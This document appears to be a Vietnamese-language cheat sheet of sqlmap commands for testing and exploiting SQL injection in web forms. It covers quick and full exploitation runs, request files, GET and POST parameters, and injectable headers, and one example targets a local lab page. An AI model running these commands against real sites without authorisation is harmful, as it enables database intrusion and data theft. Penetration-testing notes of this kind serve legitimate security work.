> [!NOTE]
> Những dữ liệu năm trong ngoặc ngọn ```<>``` là dữ liệu tuỳ chỉnh
## Khai thác nhanh (bỏ qua các tuỳ chọn)
- Lệnh quét nhanh sẽ bỏ qua các tuỳ chọn được đưa ra trong quá trình quét, nhưng vẫn có thể thu về các thông tin cơ bản về lỗ hổng
- Câu lệnh sử dựng khi chưua có thông tin về mục tiêu
  
		sqlmap -u "<http://example.com>" --forms --flush-session --answers="form=Y,fill blank fields=n,skip=Y,tests=N,follow=N,keep=N,quit=Y,resume=Y" --batch
- **Lưu ý**: Tuỳ chọn ```--flush-session``` để xoá phiên làm việc trước đó, nếu cần sử dụng dữ liệu từ phiên làm việc trước thì cần bỏ tuỳ chọn này
## Khai thác toàn bộ
- Quét và thực hiện khai thác lỗ hổng với các tuỳ chọn mặc định
  
		sqlmap -u "<http://example.com>" --forms --flush-session --batch --all
- **Lưu ý**: Tuỳ chọn ```--flush-session``` để xoá phiên làm việc trước đó, nếu cần sử dụng dữ liệu từ phiên làm việc trước thì cần bỏ tuỳ chọn này
## Tuỳ chỉnh
- Lệnh cơ bản:

		sqlmap -u <URL> [OPTIONS]
- Ta sẽ kết hợp câu lệnh cơ bản với các tuỳ chọn để phù hợp với từng mục đích
### Cung cấp thông tin Request
- Cung cấp file Request:
  
		sqlmap -r <req.txt> --batch
- Cung cấp tham số cho GET Request:

		sqlmap -u "<http://example.com/?id=*>" -p id --batch
- Cung cấp tham số cho POST Request:
  
 		sqlmap -u "<http://example.com>" --data "username=*&password=*" --batch
- Cung cấp Headers:

		sqlmap -u "<http://example.com>" --headers="<x-forwarded-for:127.0.0.1*>" --batch
		sqlmap -u "<http://example.com>" --headers="<referer:*>"
		
		sqlmap -u http:/127.0.0.1:9991/www/SQL/sql1.php --data="firstname=&submit=Submit" --user-agent="Mozilla/5.0" --batch

	- ```--data=DATA```: Cung cấp tham số cho POST Request
  		- ```-p ID```: Cung cấp tham số cho GET Request
	- ```--user-agent=AGENT```: Cung cấp user-agent của mục tiêu
